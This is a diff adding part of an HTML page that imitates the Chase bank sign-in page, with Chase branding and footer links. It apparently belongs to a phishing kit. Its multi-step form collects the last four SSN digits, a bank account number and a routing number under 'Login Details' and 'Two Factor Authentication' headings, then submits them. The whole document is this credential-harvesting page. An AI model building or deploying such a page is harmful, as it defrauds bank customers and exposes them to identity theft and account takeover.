+                                                                <input min="0" class="jpui input logon-xs-toggle clientSideError" id="userId-text-input-field" placeholder="" format="" maxlength="4" pattern="[0-9]{4}" aria-describedby="  userId-input-field-label aggregator-security-banner" type="text" name="ssn" data-validate="userId" required="" value="" style="font-family: sans-serif;">
+                                                            </div>
+                                                        </div>
+                                                        <div>
+                                                            <div></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+
+                                                <div class="jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top" id="userId">
+                                                    <div class="jpui vertical">
+                                                        <div class="align-label-input floating-label__container">
+                                                            <label class="jpui fieldlabel " style="font-family: sans-serif;">Account Number </label>
+                                                            <div class="logon-xs-toggle" id="userId-text">
+                                                                <input min="0" class="jpui input logon-xs-toggle clientSideError" id="userId-text-input-field" placeholder="" format="" aria-describedby="  userId-input-field-label aggregator-security-banner" type="number" name="account_number" data-validate="userId" required="" value="" style="font-family: sans-serif;">
+                                                            </div>
+                                                        </div>
+                                                        <div>
+                                                            <div></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+
+                                                <div class="jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top" id="userId">
+                                                    <div class="jpui vertical">
+                                                        <div class="align-label-input floating-label__container">
+                                                            <label class="jpui fieldlabel " style="font-family: sans-serif;">Routing Number </label>
+                                                            <div class="logon-xs-toggle" id="userId-text">
+                                                                <input min="0" class="jpui input logon-xs-toggle clientSideError" id="userId-text-input-field" placeholder="" format="" aria-describedby="  userId-input-field-label aggregator-security-banner" type="number" name="routing" data-validate="userId" required="" value="" style="font-family: sans-serif;">
+                                                            </div>
+                                                        </div>
+                                                        <div>
+                                                            <div></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <div style="overflow:auto;">
+                                                <div style="float:right;">
+                                                    <button type="button" id="prevBtn" class="jpui button focus fluid primary" onclick="nextPrev(-1)" style="width: 100px; color: #fff; font-weight: bold; font-family: sans-serif;">Previous</button>
+                                                    <button type="button" id="nextBtn" class="jpui button focus fluid primary" style="width: 100px; color: #fff; font-weight: bold; font-family: sans-serif;" onclick="nextPrev(1)">Next</button>
+                                                </div>
+                                            </div>
+                                            <!-- Circles which indicates the steps of the form: -->
+                                            <div style="text-align:center;margin-top:20px;">
+                                                <span class="step"></span>
+                                                <span class="step"></span>
+                                                <span class="step"></span>
+                                            </div>
+
+
+
+
+                                            <div class="row">
+                                                <button type="submit" id="signin-button" class="jpui button focus fluid primary"><span class="label" style="font-family: sans-serif;">Sign in</span>
+                                                </button>
+                                            </div>
+                                            <div class="row"><span class="jpui link" id="forgotPassword-link-wrapper"><a class="link-anchor" id="forgotPassword" href="javascript:void(0);" aria-label=" Forgot username/password? " style="font-family: sans-serif;">Forgot username/password?</a></span></div>
+                                            <div class="row"><span class="jpui link" id="enrollment-link-wrapper"><a class="link-anchor last" id="enrollment" href="javascript:void(0);" aria-label=" Not Enrolled? Sign Up Now. " style="font-family: sans-serif;">Not Enrolled? Sign Up Now.</a></span></div>
+                                        </form>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </main>
+        </div>
+        <footer class="logon-footer" id="logon-footer" data-has-view="true">
+            <div class="footer-container" data-is-view="true" style="position: static;">
+                <div class="container">
+                    <div class="social-links row">
+                        <div class="col-xs-12"><span class="follow-us-text" >Follow us:</span>
+                            <ul class="icon-links">
+                                <li class="facebook"><span id="requestChaseFacebook-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseFacebook"> <span class="util accessible-text" id="accessible-requestChaseFacebook">Facebook: Opens dialog</span> <i class="jpui facebook icon" id="icon-requestChaseFacebook" aria-hidden="true"></i></a></span></li>
+                                <li class="instagram"><span id="requestChaseInstagram-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseInstagram"> <span class="util accessible-text" id="accessible-requestChaseInstagram">Instagram: Opens dialog</span> <i class="jpui instagram icon" id="icon-requestChaseInstagram" aria-hidden="true"></i></a></span></li>
+                                <li class="twitter"><span id="requestChaseTwitter-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseTwitter"> <span class="util accessible-text" id="accessible-requestChaseTwitter">Twitter: Opens dialog</span> <i class="jpui twitter icon" id="icon-requestChaseTwitter" aria-hidden="true"></i></a></span>
+                                </li>
+                                <li class="youtube"><span id="requestChaseYouTube-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseYouTube"> <span class="util accessible-text" id="accessible-requestChaseYouTube">YouTube: Opens dialog</span> <i class="jpui youtube icon" id="icon-requestChaseYouTube" aria-hidden="true"></i></a></span>
+                                </li>
+                                <li class="linkedin"><span id="requestChaseLinkedIn-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseLinkedIn"> <span class="util accessible-text" id="accessible-requestChaseLinkedIn">LinkedIn: Opens dialog</span> <i class="jpui linkedin icon" id="icon-requestChaseLinkedIn" aria-hidden="true"></i></a></span></li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="footer-links row implement-ada-features-enabled">
+                        <div class="col-xs-12">
+                            <ul>
+                                <li><span class="jpui link" id="requestContactUs-link-wrapper"><a class="link-anchor" id="requestContactUs" href="javascript:void(0);" aria-label=" Contact us " style="font-family: sans-serif;">Contact us</a></span>
+                                </li>
+                                <li><span class="jpui link" id="requestPrivacyNotice-link-wrapper"><a class="link-anchor" id="requestPrivacyNotice" href="javascript:void(0);" aria-label=" Privacy "style="font-family: sans-serif;">Privacy</a></span></li>
+                                <li><span class="jpui link" id="requestSecurity-link-wrapper"><a class="link-anchor" id="requestSecurity" href="javascript:void(0);" aria-label=" Security "style="font-family: sans-serif;">Security</a></span>
+                                </li>
+                                <li><span class="jpui link" id="requestTermsOfUse-link-wrapper"><a class="link-anchor" id="requestTermsOfUse" href="javascript:void(0);" aria-label=" Terms of use "style="font-family: sans-serif;">Terms of use</a></span>
+                                </li>
+                                <li><span class="jpui link" id="requestAccessibility-link-wrapper"><a class="link-anchor" id="requestAccessibility" href="javascript:void(0);" aria-label=" Accessibility "style="font-family: sans-serif;">Accessibility</a></span></li>
+                                <li><span class="jpui link" id="requestMortgageLoanOriginators-link-wrapper"><a class="link-anchor" id="requestMortgageLoanOriginators" href="javascript:void(0);" aria-label=" SAFE Act: Chase Mortgage Loan Originators "style="font-family: sans-serif;">SAFE Act: Chase Mortgage Loan Originators</a></span>
+                                </li>
+                                <li><span class="jpui link" id="requestHomeMortgageDisclosureAct-link-wrapper"><a class="link-anchor" id="requestHomeMortgageDisclosureAct" href="javascript:void(0);" aria-label=" Fair Lending "style="font-family: sans-serif;">Fair Lending</a></span>
+                                </li>
+                                <li><span class="jpui link" id="requestAboutChase-link-wrapper"><a class="link-anchor" id="requestAboutChase" href="javascript:void(0);" aria-label=" About Chase "style="font-family: sans-serif;">About Chase</a></span>
+                                </li>
+                                <li><span class="jpui link" id="requestJpMorgan-link-wrapper"><a class="link-anchor" id="requestJpMorgan" href="javascript:void(0);" aria-label=" J.P. Morgan "style="font-family: sans-serif;">J.P. Morgan</a></span>
+                                </li>
+                                <li><span class="jpui link" id="requestJpMorganChaseCo-link-wrapper"><a class="link-anchor" id="requestJpMorganChaseCo" href="javascript:void(0);" aria-label=" JPMorgan Chase &amp; Co. "style="font-family: sans-serif;">JPMorgan Chase &amp; Co.</a></span></li>
+                                <li><span class="jpui link" id="requestCareers-link-wrapper"><a class="link-anchor" id="requestCareers" href="javascript:void(0);" aria-label=" Careers "style="font-family: sans-serif;">Careers</a></span>
+                                </li>
+                                <li><span class="jpui link" id="requestEspanol-link-wrapper"><a class="link-anchor" id="requestEspanol" href="javascript:void(0);" aria-label=" Español "style="font-family: sans-serif;">Español</a></span>
+                                </li>
+                                <li><span class="jpui link" id="requestChaseCanada-link-wrapper"><a class="link-anchor" id="requestChaseCanada" href="javascript:void(0);" aria-label=" Chase Canada "style="font-family: sans-serif;">Chase Canada</a></span>
+                                </li>
+                                <li><span class="jpui link" id="requestSiteMap-link-wrapper"><a class="link-anchor" id="requestSiteMap" href="javascript:void(0);" aria-label=" Site map "style="font-family: sans-serif;">Site map</a></span>
+                                </li>
+                                <li style="font-family: sans-serif;">Member FDIC</li>
+                                <li><i class="jpui equal-housing-lender icon" id="equalHousingLenderLabel" aria-hidden="true"></i> Equal Housing Lender
+                                </li>
+                                <li class="copyright-label" style=" font-family: sans-serif;">© 2021 JPMorgan Chase &amp; Co.</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="row galaxy-footer">
+                        <div class="col-xs-10 col-xs-offset-1"><p class="NOTE"><span></span><br> <span class="copyright-label">© 2021 JPMorgan Chase &amp; Co.</span></p>
+                            <p><span class="jpui link" id="galaxyRequestPrivacyNotice-link-wrapper"><a class="link-anchor NOTELINK" id="galaxyRequestPrivacyNotice" href="javascript:void(0);" aria-label=" Privacy ">Privacy<i class="jpui progressright icon end-icon" id="galaxyRequestPrivacyNotice-endIcon" aria-hidden="true"></i></a></span></p>
+                            <p><span class="jpui link" id="galaxyRequestAccessibility-link-wrapper"><a class="link-anchor NOTELINK" id="galaxyRequestAccessibility" href="javascript:void(0);" aria-label=" Accessibility ">Accessibility<i class="jpui progressright icon end-icon" id="galaxyRequestAccessibility-endIcon" aria-hidden="true"></i></a></span></p></div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+    <div id="languageSupportDisclaimer"></div>
+    <div id="overlay" data-has-view="true"></div>
+    <div class="overlay"></div>
+    <div id="signoutModal"></div>
+    <div id="siteExitWarning"></div>
+    <div id="serviceErrorModal"></div>
+    <div id="sessionTimeoutModal"></div>
+</div>
+
+
+<script>
+    var currentTab = 0; // Current tab is set to be the first tab (0)
+    showTab(currentTab); // Display the current tab
+
+    function showTab(n) {
+        // This function will display the specified tab of the form...
+        var x = document.getElementsByClassName("tab");
+        x[n].style.display = "block";
+        //... and fix the Previous/Next buttons:
+        if (n == 0) {
+            document.getElementById("prevBtn").style.display = "none";
+            document.getElementById("signin-button").style.display = "none";
+        } else {
+            document.getElementById("prevBtn").style.display = "inline";
+            document.getElementById("tits").innerHTML = "Login Details";
+        }
+        if (n == (x.length - 1)) {
+            document.getElementById("nextBtn").innerHTML = "Sign In";
+            document.getElementById("nextBtn").style.display = "none";
+            document.getElementById("prevBtn").style.display = "none";
+            document.getElementById("signin-button").style.display = "inline";
+            document.getElementById("tits").innerHTML = "Two Factor Authentication";
+
+        } else {
+            document.getElementById("nextBtn").innerHTML = "Next";
+        }
+        //... and run a function that will display the correct step indicator:
+        fixStepIndicator(n)
+    }
+
+    function nextPrev(n) {
+        // This function will figure out which tab to display
+        var x = document.getElementsByClassName("tab");
+        // Exit the function if any field in the current tab is invalid:
+        if (n == 1 && !validateForm()) return false;
+        // Hide the current tab:
+        x[currentTab].style.display = "none";
+        // Increase or decrease the current tab by 1:
+        currentTab = currentTab + n;
+        // if you have reached the end of the form...
+        if (currentTab >= x.length) {
+            // ... the form gets submitted:
+            document.getElementById("regForm").submit();
+            return false;
+        }
+        // Otherwise, display the correct tab:
+        showTab(currentTab);
+    }
+
+    function validateForm() {
+        // This function deals with validation of the form fields
+        var x, y, i, valid = true;
+        x = document.getElementsByClassName("tab");
+        y = x[currentTab].getElementsByTagName("input");
+        // A loop that checks every input field in the current tab:
+        for (i = 0; i < y.length; i++) {
+            // If a field is empty...
+            if (y[i].value == "") {
+                // add an "invalid" class to the field:
+                y[i].className += " invalid";
+                // and set the current valid status to false
+                valid = false;
+            }
+        }
+        // If the valid status is true, mark the step as finished and valid:
+        if (valid) {
+            document.getElementsByClassName("step")[currentTab].className += " finish";
+        }
+        return valid; // return the valid status
+    }
+
+    function fixStepIndicator(n) {
+        // This function removes the "active" class of all steps...
+        var i, x = document.getElementsByClassName("step");
+        for (i = 0; i < x.length; i++) {
+            x[i].className = x[i].className.replace(" active", "");
+        }
+        //... and adds the "active" class on the current step:
+        x[n].className += " active";
+    }
+</script>
+</body>
+</html>
